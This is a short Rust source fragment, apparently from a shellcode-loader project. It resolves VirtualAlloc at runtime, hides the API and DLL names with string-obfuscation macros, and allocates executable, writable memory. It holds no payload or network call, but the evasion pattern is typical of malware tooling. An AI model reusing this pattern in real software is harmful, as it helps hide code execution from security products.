use crate::utils::{load_library, get_proc_address};
pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use obfstr::{obfstr, obfbytes};
    use core::ffi::c_void;

    type VirtualAllocFn = unsafe extern "system" fn(lp_address: *mut c_void, dw_size: usize, fl_allocation_type: u32, fl_protect: u32) -> *mut c_void;

    let kernel32 = load_library(obfbytes!(b"kernel32.dll\0").as_slice())?;
    let virtual_alloc: VirtualAllocFn = core::mem::transmute(get_proc_address(kernel32, obfbytes!(b"VirtualAlloc\0").as_slice())?);

    let p = virtual_alloc(core::ptr::null_mut(), size, 0x00001000, 0x40) as *mut u8; // MEM_COMMIT, PAGE_EXECUTE_READWRITE
    if p.is_null() {
        return Err(obfstr!("VirtualAlloc failed").to_string());
    }
    Ok(p)
}